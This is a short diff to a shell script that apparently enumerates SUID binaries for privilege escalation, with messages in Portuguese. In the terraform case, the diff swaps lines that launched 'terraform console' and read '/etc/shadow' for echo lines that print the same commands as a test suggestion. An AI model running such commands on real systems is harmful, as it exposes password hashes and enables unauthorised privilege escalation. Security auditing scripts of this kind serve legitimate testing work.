@@ -815,8 +815,8 @@ EOF
             ;;
         terraform)
             echo "[+] $path → terraform SUID encontrado! Teste:"
-            "$path" console
-            file("/etc/shadow")
+            echo "terraform console"
+            echo "file("/etc/shadow")"
             ;;
         tftp)
             echo "[+] $path → tftp SUID encontrado! Teste:"
